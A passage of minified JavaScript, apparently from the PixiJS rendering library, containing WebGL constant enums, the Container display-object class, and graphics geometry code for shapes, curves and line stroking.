t[t.RGB_INTEGER=36248]="RGB_INTEGER",t[t.RG_INTEGER=33320]="RG_INTEGER",t[t.RED_INTEGER=36244]="RED_INTEGER",t[t.ALPHA=6406]="ALPHA",t[t.LUMINANCE=6409]="LUMINANCE",t[t.LUMINANCE_ALPHA=6410]="LUMINANCE_ALPHA",t[t.DEPTH_COMPONENT=6402]="DEPTH_COMPONENT",t[t.DEPTH_STENCIL=34041]="DEPTH_STENCIL"}(hf||(hf={})),function(t){t[t.TEXTURE_2D=3553]="TEXTURE_2D",t[t.TEXTURE_CUBE_MAP=34067]="TEXTURE_CUBE_MAP",t[t.TEXTURE_2D_ARRAY=35866]="TEXTURE_2D_ARRAY",t[t.TEXTURE_CUBE_MAP_POSITIVE_X=34069]="TEXTURE_CUBE_MAP_POSITIVE_X",t[t.TEXTURE_CUBE_MAP_NEGATIVE_X=34070]="TEXTURE_CUBE_MAP_NEGATIVE_X",t[t.TEXTURE_CUBE_MAP_POSITIVE_Y=34071]="TEXTURE_CUBE_MAP_POSITIVE_Y",t[t.TEXTURE_CUBE_MAP_NEGATIVE_Y=34072]="TEXTURE_CUBE_MAP_NEGATIVE_Y",t[t.TEXTURE_CUBE_MAP_POSITIVE_Z=34073]="TEXTURE_CUBE_MAP_POSITIVE_Z",t[t.TEXTURE_CUBE_MAP_NEGATIVE_Z=34074]="TEXTURE_CUBE_MAP_NEGATIVE_Z"}(uf||(uf={})),function(t){t[t.UNSIGNED_BYTE=5121]="UNSIGNED_BYTE",t[t.UNSIGNED_SHORT=5123]="UNSIGNED_SHORT",t[t.UNSIGNED_SHORT_5_6_5=33635]="UNSIGNED_SHORT_5_6_5",t[t.UNSIGNED_SHORT_4_4_4_4=32819]="UNSIGNED_SHORT_4_4_4_4",t[t.UNSIGNED_SHORT_5_5_5_1=32820]="UNSIGNED_SHORT_5_5_5_1",t[t.UNSIGNED_INT=5125]="UNSIGNED_INT",t[t.UNSIGNED_INT_10F_11F_11F_REV=35899]="UNSIGNED_INT_10F_11F_11F_REV",t[t.UNSIGNED_INT_2_10_10_10_REV=33640]="UNSIGNED_INT_2_10_10_10_REV",t[t.UNSIGNED_INT_24_8=34042]="UNSIGNED_INT_24_8",t[t.UNSIGNED_INT_5_9_9_9_REV=35902]="UNSIGNED_INT_5_9_9_9_REV",t[t.BYTE=5120]="BYTE",t[t.SHORT=5122]="SHORT",t[t.INT=5124]="INT",t[t.FLOAT=5126]="FLOAT",t[t.FLOAT_32_UNSIGNED_INT_24_8_REV=36269]="FLOAT_32_UNSIGNED_INT_24_8_REV",t[t.HALF_FLOAT=36193]="HALF_FLOAT"}(lf||(lf={})),function(t){t[t.FLOAT=0]="FLOAT",t[t.INT=1]="INT",t[t.UINT=2]="UINT"}(cf||(cf={})),function(t){t[t.NEAREST=0]="NEAREST",t[t.LINEAR=1]="LINEAR"}(df||(df={})),function(t){t[t.CLAMP=33071]="CLAMP",t[t.REPEAT=10497]="REPEAT",t[t.MIRRORED_REPEAT=33648]="MIRRORED_REPEAT"}(pf||(pf={})),function(t){t[t.OFF=0]="OFF",t[t.POW2=1]="POW2",t[t.ON=2]="ON",t[t.ON_MANUAL=3]="ON_MANUAL"}(ff||(ff={})),function(t){t[t.NPM=0]="NPM",t[t.UNPACK=1]="UNPACK",t[t.PMA=2]="PMA",t[t.NO_PREMULTIPLIED_ALPHA=0]="NO_PREMULTIPLIED_ALPHA",t[t.PREMULTIPLY_ON_UPLOAD=1]="PREMULTIPLY_ON_UPLOAD",t[t.PREMULTIPLY_ALPHA=2]="PREMULTIPLY_ALPHA",t[t.PREMULTIPLIED_ALPHA=2]="PREMULTIPLIED_ALPHA"}(gf||(gf={})),function(t){t[t.NO=0]="NO",t[t.YES=1]="YES",t[t.AUTO=2]="AUTO",t[t.BLEND=0]="BLEND",t[t.CLEAR=1]="CLEAR",t[t.BLIT=2]="BLIT"}(mf||(mf={})),function(t){t[t.AUTO=0]="AUTO",t[t.MANUAL=1]="MANUAL"}(vf||(vf={})),function(t){t.LOW="lowp",t.MEDIUM="mediump",t.HIGH="highp"}(_f||(_f={})),function(t){t[t.NONE=0]="NONE",t[t.SCISSOR=1]="SCISSOR",t[t.STENCIL=2]="STENCIL",t[t.SPRITE=3]="SPRITE",t[t.COLOR=4]="COLOR"}(yf||(yf={})),function(t){t[t.RED=1]="RED",t[t.GREEN=2]="GREEN",t[t.BLUE=4]="BLUE",t[t.ALPHA=8]="ALPHA"}(xf||(xf={})),function(t){t[t.NONE=0]="NONE",t[t.LOW=2]="LOW",t[t.MEDIUM=4]="MEDIUM",t[t.HIGH=8]="HIGH"}(Ef||(Ef={})),function(t){t[t.ELEMENT_ARRAY_BUFFER=34963]="ELEMENT_ARRAY_BUFFER",t[t.ARRAY_BUFFER=34962]="ARRAY_BUFFER",t[t.UNIFORM_BUFFER=35345]="UNIFORM_BUFFER"}(bf||(bf={}));var Sf,Af,Cf=function(t){function e(){var e=t.call(this)||this;return e.children=[],e.sortableChildren=Fl.SORTABLE_CHILDREN,e.sortDirty=!1,e}return ef(e,t),e.prototype.onChildrenChange=function(t){},e.prototype.addChild=function(){for(var t=arguments,e=[],i=0;i<arguments.length;i++)e[i]=t[i];if(e.length>1)for(var r=0;r<e.length;r++)this.addChild(e[r]);else{var n=e[0];n.parent&&n.parent.removeChild(n),n.parent=this,this.sortDirty=!0,n.transform._parentID=-1,this.children.push(n),this._boundsID++,this.onChildrenChange(this.children.length-1),this.emit("childAdded",n,this,this.children.length-1),n.emit("added",this)}return e[0]},e.prototype.addChildAt=function(t,e){if(e<0||e>this.children.length)throw new Error(t+"addChildAt: The index "+e+" supplied is out of bounds "+this.children.length);return t.parent&&t.parent.removeChild(t),t.parent=this,this.sortDirty=!0,t.transform._parentID=-1,this.children.splice(e,0,t),this._boundsID++,this.onChildrenChange(e),t.emit("added",this),this.emit("childAdded",t,this,e),t},e.prototype.swapChildren=function(t,e){if(t!==e){var i=this.getChildIndex(t),r=this.getChildIndex(e);this.children[i]=e,this.children[r]=t,this.onChildrenChange(i<r?i:r)}},e.prototype.getChildIndex=function(t){var e=this.children.indexOf(t);if(-1===e)throw new Error("The supplied DisplayObject must be a child of the caller");return e},e.prototype.setChildIndex=function(t,e){if(e<0||e>=this.children.length)throw new Error("The index "+e+" supplied is out of bounds "+this.children.length);var i=this.getChildIndex(t);Zl(this.children,i,1),this.children.splice(e,0,t),this.onChildrenChange(e)},e.prototype.getChildAt=function(t){if(t<0||t>=this.children.length)throw new Error("getChildAt: Index ("+t+") does not exist.");return this.children[t]},e.prototype.removeChild=function(){for(var t=arguments,e=[],i=0;i<arguments.length;i++)e[i]=t[i];if(e.length>1)for(var r=0;r<e.length;r++)this.removeChild(e[r]);else{var n=e[0],s=this.children.indexOf(n);if(-1===s)return null;n.parent=null,n.transform._parentID=-1,Zl(this.children,s,1),this._boundsID++,this.onChildrenChange(s),n.emit("removed",this),this.emit("childRemoved",n,this,s)}return e[0]},e.prototype.removeChildAt=function(t){var e=this.getChildAt(t);return e.parent=null,e.transform._parentID=-1,Zl(this.children,t,1),this._boundsID++,this.onChildrenChange(t),e.emit("removed",this),this.emit("childRemoved",e,this,t),e},e.prototype.removeChildren=function(t,e){void 0===t&&(t=0),void 0===e&&(e=this.children.length);var i,r=t,n=e-r;if(n>0&&n<=e){i=this.children.splice(r,n);for(var s=0;s<i.length;++s)i[s].parent=null,i[s].transform&&(i[s].transform._parentID=-1);for(this._boundsID++,this.onChildrenChange(t),s=0;s<i.length;++s)i[s].emit("removed",this),this.emit("childRemoved",i[s],this,s);return i}if(0===n&&0===this.children.length)return[];throw new RangeError("removeChildren: numeric values are outside the acceptable range.")},e.prototype.sortChildren=function(){for(var t=!1,e=0,i=this.children.length;e<i;++e){var r=this.children[e];r._lastSortedIndex=e,t||0===r.zIndex||(t=!0)}t&&this.children.length>1&&this.children.sort(wf),this.sortDirty=!1},e.prototype.updateTransform=function(){this.sortableChildren&&this.sortDirty&&this.sortChildren(),this._boundsID++,this.transform.updateTransform(this.parent.transform),this.worldAlpha=this.alpha*this.parent.worldAlpha;for(var t=0,e=this.children.length;t<e;++t){var i=this.children[t];i.visible&&i.updateTransform()}},e.prototype.calculateBounds=function(){this._bounds.clear(),this._calculateBounds();for(var t=0;t<this.children.length;t++){var e=this.children[t];if(e.visible&&e.renderable)if(e.calculateBounds(),e._mask){var i=e._mask.isMaskData?e._mask.maskObject:e._mask;i?(i.calculateBounds(),this._bounds.addBoundsMask(e._bounds,i._bounds)):this._bounds.addBounds(e._bounds)}else e.filterArea?this._bounds.addBoundsArea(e._bounds,e.filterArea):this._bounds.addBounds(e._bounds)}this._bounds.updateID=this._boundsID},e.prototype.getLocalBounds=function(e,i){void 0===i&&(i=!1);var r=t.prototype.getLocalBounds.call(this,e);if(!i)for(var n=0,s=this.children.length;n<s;++n){var o=this.children[n];o.visible&&o.updateTransform()}return r},e.prototype._calculateBounds=function(){},e.prototype._renderWithCulling=function(t){var i=t.renderTexture.sourceFrame;if(i.width>0&&i.height>0){var r,n;if(this.cullArea?(r=this.cullArea,n=this.worldTransform):this._render!==e.prototype._render&&(r=this.getBounds(!0)),r&&i.intersects(r,n))this._render(t);else if(this.cullArea)return;for(var s=0,o=this.children.length;s<o;++s){var a=this.children[s],h=a.cullable;a.cullable=h||!this.cullArea,a.render(t),a.cullable=h}}},e.prototype.render=function(t){if(this.visible&&!(this.worldAlpha<=0)&&this.renderable)if(this._mask||this.filters&&this.filters.length)this.renderAdvanced(t);else if(this.cullable)this._renderWithCulling(t);else{this._render(t);for(var e=0,i=this.children.length;e<i;++e)this.children[e].render(t)}},e.prototype.renderAdvanced=function(t){var e=this.filters,i=this._mask;if(e){this._enabledFilters||(this._enabledFilters=[]),this._enabledFilters.length=0;for(var r=0;r<e.length;r++)e[r].enabled&&this._enabledFilters.push(e[r])}var n=e&&this._enabledFilters&&this._enabledFilters.length||i&&(!i.isMaskData||i.enabled&&(i.autoDetect||i.type!==yf.NONE));if(n&&t.batch.flush(),e&&this._enabledFilters&&this._enabledFilters.length&&t.filter.push(this,this._enabledFilters),i&&t.mask.push(this,this._mask),this.cullable)this._renderWithCulling(t);else{this._render(t),r=0;for(var s=this.children.length;r<s;++r)this.children[r].render(t)}n&&t.batch.flush(),i&&t.mask.pop(this),e&&this._enabledFilters&&this._enabledFilters.length&&t.filter.pop()},e.prototype._render=function(t){},e.prototype.destroy=function(e){t.prototype.destroy.call(this),this.sortDirty=!1;var i="boolean"==typeof e?e:e&&e.children,r=this.removeChildren(0,this.children.length);if(i)for(var n=0;n<r.length;++n)r[n].destroy(e)},Object.defineProperty(e.prototype,"width",{get:function(){return this.scale.x*this.getLocalBounds().width},set:function(t){var e=this.getLocalBounds().width;this.scale.x=0!==e?t/e:1,this._width=t},enumerable:!1,configurable:!0}),Object.defineProperty(e.prototype,"height",{get:function(){return this.scale.y*this.getLocalBounds().height},set:function(t){var e=this.getLocalBounds().height;this.scale.y=0!==e?t/e:1,this._height=t},enumerable:!1,configurable:!0}),e}(Tf);Cf.prototype.containerUpdateTransform=Cf.prototype.updateTransform,function(t){t.MITER="miter",t.BEVEL="bevel",t.ROUND="round"}(Sf||(Sf={})),function(t){t.BUTT="butt",t.ROUND="round",t.SQUARE="square"}(Af||(Af={}));var If={adaptive:!0,maxLength:10,minSegments:8,maxSegments:2048,epsilon:1e-4,_segmentsCount:function(t,e){if(void 0===e&&(e=20),!this.adaptive||!t||isNaN(t))return e;var i=Math.ceil(t/this.maxLength);return i<this.minSegments?i=this.minSegments:i>this.maxSegments&&(i=this.maxSegments),i}},Rf=function(){function t(){this.color=16777215,this.alpha=1,this.texture=ud.WHITE,this.matrix=null,this.visible=!1,this.reset()}return t.prototype.clone=function(){var e=new t;return e.color=this.color,e.alpha=this.alpha,e.texture=this.texture,e.matrix=this.matrix,e.visible=this.visible,e},t.prototype.reset=function(){this.color=16777215,this.alpha=1,this.texture=ud.WHITE,this.matrix=null,this.visible=!1},t.prototype.destroy=function(){this.texture=null,this.matrix=null},t}(),Pf=function(t,e){return(Pf=Object.setPrototypeOf||{__proto__:[]}instanceof Array&&function(t,e){t.__proto__=e}||function(t,e){for(var i in e)e.hasOwnProperty(i)&&(t[i]=e[i])})(t,e)};function Of(t,e){function i(){this.constructor=t}Pf(t,e),t.prototype=null===e?Object.create(e):(i.prototype=e.prototype,new i)}function Nf(t,e){var i,r;void 0===e&&(e=!1);var n=t.length;if(!(n<6)){for(var s=0,o=0,a=t[n-2],h=t[n-1];o<n;o+=2){var u=t[o],l=t[o+1];s+=(u-a)*(l+h),a=u,h=l}if(!e&&s>0||e&&s<=0){var c=n/2;for(o=c+c%2;o<n;o+=2){var d=n-o-2,p=n-o-1,f=o,g=o+1;i=[t[f],t[d]],t[d]=i[0],t[f]=i[1],r=[t[g],t[p]],t[p]=r[0],t[g]=r[1]}}}}var Mf={build:function(t){t.points=t.shape.points.slice()},triangulate:function(t,e){var i=t.points,r=t.holes,n=e.points,s=e.indices;if(i.length>=6){Nf(i,!1);for(var o=[],a=0;a<r.length;a++){var h=r[a];Nf(h.points,!0),o.push(i.length/2),i=i.concat(h.points)}var u=Bl(i,o,2);if(!u)return;var l=n.length/2;for(a=0;a<u.length;a+=3)s.push(u[a]+l),s.push(u[a+1]+l),s.push(u[a+2]+l);for(a=0;a<i.length;a++)n.push(i[a])}}},Ff={build:function(t){var e,i,r,n,s,o,a=t.points;if(t.type===pc.CIRC){var h=t.shape;e=h.x,i=h.y,s=o=h.radius,r=n=0}else if(t.type===pc.ELIP){var u=t.shape;e=u.x,i=u.y,s=u.width,o=u.height,r=n=0}else{var l=t.shape,c=l.width/2,d=l.height/2;e=l.x+c,i=l.y+d,r=c-(s=o=Math.max(0,Math.min(l.radius,Math.min(c,d)))),n=d-o}if(s>=0&&o>=0&&r>=0&&n>=0){var p=Math.ceil(2.3*Math.sqrt(s+o)),f=8*p+(r?4:0)+(n?4:0);if(a.length=f,0!==f){if(0===p)return a.length=8,a[0]=a[6]=e+r,a[1]=a[3]=i+n,a[2]=a[4]=e-r,void(a[5]=a[7]=i-n);var g,m,v=0,_=4*p+(r?2:0)+2,y=_,x=f,E=e+(g=r+s),b=e-g,T=i+(m=n);if(a[v++]=E,a[v++]=T,a[--_]=T,a[--_]=b,n){var D=i-m;a[y++]=b,a[y++]=D,a[--x]=D,a[--x]=E}for(var w=1;w<p;w++){var S=Math.PI/2*(w/p);E=e+(g=r+Math.cos(S)*s),b=e-g,T=i+(m=n+Math.sin(S)*o),D=i-m,a[v++]=E,a[v++]=T,a[--_]=T,a[--_]=b,a[y++]=b,a[y++]=D,a[--x]=D,a[--x]=E}E=e+(g=r),b=e-g,T=i+(m=n+o),D=i-m,a[v++]=E,a[v++]=T,a[--x]=D,a[--x]=E,r&&(a[v++]=b,a[v++]=T,a[--x]=D,a[--x]=b)}}else a.length=0},triangulate:function(t,e){var i=t.points,r=e.points,n=e.indices;if(0!==i.length){var s,o,a=r.length/2,h=a;if(t.type!==pc.RREC){var u=t.shape;s=u.x,o=u.y}else{var l=t.shape;s=l.x+l.width/2,o=l.y+l.height/2}var c=t.matrix;r.push(t.matrix?c.a*s+c.c*o+c.tx:s,t.matrix?c.b*s+c.d*o+c.ty:o),a++,r.push(i[0],i[1]);for(var d=2;d<i.length;d+=2)r.push(i[d],i[d+1]),n.push(a++,h,a);n.push(h+1,h,a)}}};function Lf(t,e,i){return t+(e-t)*i}function Bf(t,e,i,r,n,s,o){void 0===o&&(o=[]);for(var a=o,h=0,u=0,l=0,c=0,d=0,p=0,f=0,g=0;f<=20;++f)h=Lf(t,i,g=f/20),u=Lf(e,r,g),l=Lf(i,n,g),c=Lf(r,s,g),d=Lf(h,l,g),p=Lf(u,c,g),0===f&&a[a.length-2]===d&&a[a.length-1]===p||a.push(d,p);return a}var Uf={build:function(t){if(bg.nextRoundedRectBehavior)Ff.build(t);else{var e=t.shape,i=t.points,r=e.x,n=e.y,s=e.width,o=e.height,a=Math.max(0,Math.min(e.radius,Math.min(s,o)/2));i.length=0,a?(Bf(r,n+a,r,n,r+a,n,i),Bf(r+s-a,n,r+s,n,r+s,n+a,i),Bf(r+s,n+o-a,r+s,n+o,r+s-a,n+o,i),Bf(r+a,n+o,r,n+o,r,n+o-a,i)):i.push(r,n,r+s,n,r+s,n+o,r,n+o)}},triangulate:function(t,e){if(bg.nextRoundedRectBehavior)Ff.triangulate(t,e);else{for(var i=t.points,r=e.points,n=e.indices,s=r.length/2,o=Bl(i,null,2),a=0,h=o.length;a<h;a+=3)n.push(o[a]+s),n.push(o[a+1]+s),n.push(o[a+2]+s);for(a=0,h=i.length;a<h;a++)r.push(i[a],i[++a])}}};function kf(t,e,i,r,n,s,o,a){var h,u;o?(h=r,u=-i):(h=-r,u=i);var l=t-i*n+h,c=e-r*n+u,d=t+i*s+h,p=e+r*s+u;return a.push(l,c),a.push(d,p),2}function Gf(t,e,i,r,n,s,o,a){var h=i-t,u=r-e,l=Math.atan2(h,u),c=Math.atan2(n-t,s-e);a&&l<c?l+=2*Math.PI:!a&&l>c&&(c+=2*Math.PI);var d=l,p=c-l,f=Math.abs(p),g=Math.sqrt(h*h+u*u),m=1+(15*f*Math.sqrt(g)/Math.PI>>0),v=p/m;if(d+=v,a){o.push(t,e),o.push(i,r);for(var _=1,y=d;_<m;_++,y+=v)o.push(t,e),o.push(t+Math.sin(y)*g,e+Math.cos(y)*g);o.push(t,e),o.push(n,s)}else{for(o.push(i,r),o.push(t,e),_=1,y=d;_<m;_++,y+=v)o.push(t+Math.sin(y)*g,e+Math.cos(y)*g),o.push(t,e);o.push(n,s),o.push(t,e)}return 2*m}function Hf(t,e){t.lineStyle.native?function(t,e){var i=0,r=t.shape,n=t.points||r.points,s=r.type!==pc.POLY||r.closeStroke;if(0!==n.length){var o=e.points,a=e.indices,h=n.length/2,u=o.length/2,l=u;for(o.push(n[0],n[1]),i=1;i<h;i++)o.push(n[2*i],n[2*i+1]),a.push(l,l+1),l++;s&&a.push(l,u)}}(t,e):function(t,e){var i=t.shape,r=t.points||i.points.slice(),n=e.closePointEps;if(0!==r.length){var s=t.lineStyle,o=new xc(r[0],r[1]),a=new xc(r[r.length-2],r[r.length-1]),h=i.type!==pc.POLY||i.closeStroke,u=Math.abs(o.x-a.x)<n&&Math.abs(o.y-a.y)<n;if(h){r=r.slice(),u&&(r.pop(),r.pop(),a.set(r[r.length-2],r[r.length-1]));var l=.5*(o.x+a.x),c=.5*(a.y+o.y);r.unshift(l,c),r.push(l,c)}var d=e.points,p=r.length/2,f=r.length,g=d.length/2,m=s.width/2,v=m*m,_=s.miterLimit*s.miterLimit,y=r[0],x=r[1],E=r[2],b=r[3],T=0,D=0,w=-(x-b),S=y-E,A=0,C=0,I=Math.sqrt(w*w+S*S);w/=I,S/=I,w*=m,S*=m;var R=s.alignment,P=2*(1-R),O=2*R;h||(s.cap===Af.ROUND?f+=Gf(y-w*(P-O)*.5,x-S*(P-O)*.5,y-w*P,x-S*P,y+w*O,x+S*O,d,!0)+2:s.cap===Af.SQUARE&&(f+=kf(y,x,w,S,P,O,!0,d))),d.push(y-w*P,x-S*P),d.push(y+w*O,x+S*O);for(var N=1;N<p-1;++N){y=r[2*(N-1)],x=r[2*(N-1)+1],E=r[2*N],b=r[2*N+1],T=r[2*(N+1)],D=r[2*(N+1)+1],w=-(x-b),S=y-E,w/=I=Math.sqrt(w*w+S*S),S/=I,w*=m,S*=m,A=-(b-D),C=E-T,A/=I=Math.sqrt(A*A+C*C),C/=I,A*=m,C*=m;var M=E-y,F=x-b,L=E-T,B=D-b,U=F*L-B*M,k=U<0;if(Math.abs(U)<.1)d.push(E-w*P,b-S*P),d.push(E+w*O,b+S*O);else{var G=(-w+y)*(-S+b)-(-w+E)*(-S+x),H=(-A+T)*(-C+b)-(-A+E)*(-C+D),z=(M*H-L*G)/U,V=(B*G-F*H)/U,X=(z-E)*(z-E)+(V-b)*(V-b),j=E+(z-E)*P,$=b+(V-b)*P,W=E-(z-E)*O,Y=b-(V-b)*O,q=k?P:O;X<=Math.min(M*M+F*F,L*L+B*B)+q*q*v?s.join===Sf.BEVEL||X/v>_?(k?(d.push(j,$),d.push(E+w*O,b+S*O),d.push(j,$),d.push(E+A*O,b+C*O)):(d.push(E-w*P,b-S*P),d.push(W,Y),d.push(E-A*P,b-C*P),d.push(W,Y)),f+=2):s.join===Sf.ROUND?k?(d.push(j,$),d.push(E+w*O,b+S*O),f+=Gf(E,b,E+w*O,b+S*O,E+A*O,b+C*O,d,!0)+4,d.push(j,$),d.push(E+A*O,b+C*O)):(d.push(E-w*P,b-S*P),d.push(W,Y),f+=Gf(E,b,E-w*P,b-S*P,E-A*P,b-C*P,d,!1)+4,d.push(E-A*P,b-C*P),d.push(W,Y)):(d.push(j,$),d.push(W,Y)):(d.push(E-w*P,b-S*P),d.push(E+w*O,b+S*O),s.join===Sf.ROUND?f+=k?Gf(E,b,E+w*O,b+S*O,E+A*O,b+C*O,d,!0)+2:Gf(E,b,E-w*P,b-S*P,E-A*P,b-C*P,d,!1)+2:s.join===Sf.MITER&&X/v<=_&&(k?(d.push(W,Y),d.push(W,Y)):(d.push(j,$),d.push(j,$)),f+=2),d.push(E-A*P,b-C*P),d.push(E+A*O,b+C*O),f+=2)}}y=r[2*(p-2)],x=r[2*(p-2)+1],E=r[2*(p-1)],w=-(x-(b=r[2*(p-1)+1])),S=y-E,w/=I=Math.sqrt(w*w+S*S),S/=I,w*=m,S*=m,d.push(E-w*P,b-S*P),d.push(E+w*O,b+S*O),h||(s.cap===Af.ROUND?f+=Gf(E-w*(P-O)*.5,b-S*(P-O)*.5,E-w*P,b-S*P,E+w*O,b+S*O,d,!1)+2:s.cap===Af.SQUARE&&(f+=kf(E,b,w,S,P,O,!1,d)));var Z=e.indices,K=If.epsilon*If.epsilon;for(N=g;N<f+g-2;++N)y=d[2*N],x=d[2*N+1],E=d[2*(N+1)],b=d[2*(N+1)+1],T=d[2*(N+2)],D=d[2*(N+2)+1],Math.abs(y*(b-D)+E*(D-x)+T*(x-b))<K||Z.push(N,N+1,N+2)}}(t,e)}var zf,Vf,Xf,jf,$f,Wf,Yf,qf,Zf,Kf,Qf,Jf,tg,eg,ig,rg,ng,sg,og,ag,hg,ug=function(){function t(){}return t.curveTo=function(t,e,i,r,n,s){var o=s[s.length-2],a=s[s.length-1]-e,h=o-t,u=r-e,l=i-t,c=Math.abs(a*l-h*u);if(c<1e-8||0===n)return s[s.length-2]===t&&s[s.length-1]===e||s.push(t,e),null;var d=a*a+h*h,p=u*u+l*l,f=a*u+h*l,g=n*Math.sqrt(d)/c,m=n*Math.sqrt(p)/c,v=g*f/d,_=m*f/p,y=g*l+m*h,x=g*u+m*a,E=h*(m+v),b=a*(m+v),T=l*(g+_),D=u*(g+_);return{cx:y+t,cy:x+e,radius:n,startAngle:Math.atan2(b-x,E-y),endAngle:Math.atan2(D-x,T-y),anticlockwise:h*u>l*a}},t.arc=function(t,e,i,r,n,s,o,a,h){for(var u=o-s,l=If._segmentsCount(Math.abs(u)*n,40*Math.ceil(Math.abs(u)/vc)),c=u/(2*l),d=2*c,p=Math.cos(c),f=Math.sin(c),g=l-1,m=g%1/g,v=0;v<=g;++v){var _=c+s+d*(v+m*v),y=Math.cos(_),x=-Math.sin(_);h.push((p*y+f*x)*n+i,(p*-x+f*y)*n+r)}},t}(),lg=function(){function t(){}return t.curveLength=function(t,e,i,r,n,s,o,a){for(var h=0,u=0,l=0,c=0,d=0,p=0,f=0,g=0,m=0,v=0,_=0,y=t,x=e,E=1;E<=10;++E)v=y-(g=(f=(p=(d=1-(u=E/10))*d)*d)*t+3*p*u*i+3*d*(l=u*u)*n+(c=l*u)*o),_=x-(m=f*e+3*p*u*r+3*d*l*s+c*a),y=g,x=m,h+=Math.sqrt(v*v+_*_);return h},t.curveTo=function(e,i,r,n,s,o,a){var h=a[a.length-2],u=a[a.length-1];a.length-=2;var l=If._segmentsCount(t.curveLength(h,u,e,i,r,n,s,o)),c=0,d=0,p=0,f=0,g=0;a.push(h,u);for(var m=1,v=0;m<=l;++m)p=(d=(c=1-(v=m/l))*c)*c,g=(f=v*v)*v,a.push(p*h+3*d*v*e+3*c*f*r+g*s,p*u+3*d*v*i+3*c*f*n+g*o)},t}(),cg=function(){function t(){}return t.curveLength=function(t,e,i,r,n,s){var o=t-2*i+n,a=e-2*r+s,h=2*i-2*t,u=2*r-2*e,l=4*(o*o+a*a),c=4*(o*h+a*u),d=h*h+u*u,p=2*Math.sqrt(l+c+d),f=Math.sqrt(l),g=2*l*f,m=2*Math.sqrt(d),v=c/f;return(g*p+f*c*(p-m)+(4*d*l-c*c)*Math.log((2*f+v+p)/(v+m)))/(4*g)},t.curveTo=function(e,i,r,n,s){for(var o=s[s.length-2],a=s[s.length-1],h=If._segmentsCount(t.curveLength(o,a,e,i,r,n)),u=0,l=0,c=1;c<=h;++c){var d=c/h;u=o+(e-o)*d,l=a+(i-a)*d,s.push(u+(e+(r-e)*d-u)*d,l+(i+(n-i)*d-l)*d)}},t}(),dg=function(){function t(){this.reset()}return t.prototype.begin=function(t,e,i){this.reset(),this.style=t,this.start=e,this.attribStart=i},t.prototype.end=function(t,e){this.attribSize=e-this.attribStart,this.size=t-this.start},t.prototype.reset=function(){this.style=null,this.size=0,this.start=0,this.attribStart=0,this.attribSize=0},t}(),pg=((zf={})[pc.POLY]=Mf,zf[pc.CIRC]=Ff,zf[pc.ELIP]=Ff,zf[pc.RECT]={build:function(t){var e=t.shape,i=e.x,r=e.y,n=e.width,s=e.height,o=t.points;o.length=0,o.push(i,r,i+n,r,i+n,r+s,i,r+s)},triangulate:function(t,e){var i=t.points,r=e.points,n=r.length/2;r.push(i[0],i[1],i[2],i[3],i[6],i[7],i[4],i[5]),e.indices.push(n,n+1,n+2,n+1,n+2,n+3)}},zf[pc.RREC]=Uf,zf),fg=[],gg=[],mg=function(){function t(t,e,i,r){void 0===e&&(e=null),void 0===i&&(i=null),void 0===r&&(r=null),this.points=[],this.holes=[],this.shape=t,this.lineStyle=i,this.fillStyle=e,this.matrix=r,this.type=t.type}return t.prototype.clone=function(){return new t(this.shape,this.fillStyle,this.lineStyle,this.matrix)},t.prototype.destroy=function(){this.shape=null,this.holes.length=0,this.holes=null,this.points.length=0,this.points=null,this.lineStyle=null,this.fillStyle=null},t}(),vg=new xc,_g=function(t){function e(){var e=t.call(this)||this;return e.closePointEps=1e-4,e.boundsPadding=0,e.uvsFloat32=null,e.indicesUint16=null,e.batchable=!1,e.points=[],e.colors=[],e.uvs=[],e.indices=[],e.textureIds=[],e.graphicsData=[],e.drawCalls=[],e.batchDirty=-1,e.batches=[],e.dirty=0,e.cacheDirty=-1,e.clearDirty=0,e.shapeIndex=0,e._bounds=new Jp,e.boundsDirty=-1,e}return Of(e,t),Object.defineProperty(e.prototype,"bounds",{get:function(){return this.updateBatches(),this.boundsDirty!==this.dirty&&(this.boundsDirty=this.dirty,this.calculateBounds()),this._bounds},enumerable:!1,configurable:!0}),e.prototype.invalidate=function(){this.boundsDirty=-1,this.dirty++,this.batchDirty++,this.shapeIndex=0,this.points.length=0,this.colors.length=0,this.uvs.length=0,this.indices.length=0,this.textureIds.length=0;for(var t=0;t<this.drawCalls.length;t++)this.drawCalls[t].texArray.clear(),gg.push(this.drawCalls[t]);for(this.drawCalls.length=0,t=0;t<this.batches.length;t++){var e=this.batches[t];e.reset(),fg.push(e)}this.batches.length=0},e.prototype.clear=function(){return this.graphicsData.length>0&&(this.invalidate(),this.clearDirty++,this.graphicsData.length=0),this},e.prototype.drawShape=function(t,e,i,r){void 0===e&&(e=null),void 0===i&&(i=null),void 0===r&&(r=null);var n=new mg(t,e,i,r);return this.graphicsData.push(n),this.dirty++,this},e.prototype.drawHole=function(t,e){if(void 0===e&&(e=null),!this.graphicsData.length)return null;var i=new mg(t,null,null,e),r=this.graphicsData[this.graphicsData.length-1];return i.lineStyle=r.lineStyle,r.holes.push(i),this.dirty++,this},e.prototype.destroy=function(){t.prototype.destroy.call(this);for(var e=0;e<this.graphicsData.length;++e)this.graphicsData[e].destroy();this.points.length=0,this.points=null,this.colors.length=0,this.colors=null,this.uvs.length=0,this.uvs=null,this.indices.length=0,this.indices=null,this.indexBuffer.destroy(),this.indexBuffer=null,this.graphicsData.length=0,this.graphicsData=null,this.drawCalls.length=0,this.drawCalls=null,this.batches.length=0,this.batches=null,this._bounds=null},e.prototype.containsPoint=function(t){for(var e=this.graphicsData,i=0;i<e.length;++i){var r=e[i];if(r.fillStyle.visible&&r.shape&&(r.matrix?r.matrix.applyInverse(t,vg):vg.copyFrom(t),r.shape.contains(vg.x,vg.y))){var n=!1;if(r.holes)for(var s=0;s<r.holes.length;s++)if(r.holes[s].shape.contains(vg.x,vg.y)){n=!0;break}if(!n)return!0}}return!1},e.prototype.updateBatches=function(){if(this.graphicsData.length){if(this.validateBatching()){this.cacheDirty=this.dirty;var t=this.uvs,e=this.graphicsData,i=null,r=null;this.batches.length>0&&(r=(i=this.batches[this.batches.length-1]).style);for(var n=this.shapeIndex;n<e.length;n++){this.shapeIndex++;var s=e[n],o=s.fillStyle,a=s.lineStyle;pg[s.type].build(s),s.matrix&&this.transformPoints(s.points,s.matrix),(o.visible||a.visible)&&this.processHoles(s.holes);for(var h=0;h<2;h++){var u=0===h?o:a;if(u.visible){var l=u.texture.baseTexture,c=this.indices.length,d=this.points.length/2;l.wrapMode=al.REPEAT,0===h?this.processFill(s):this.processLine(s);var p=this.points.length/2-d;0!==p&&(i&&!this._compareStyles(r,u)&&(i.end(c,d),i=null),i||((i=fg.pop()||new 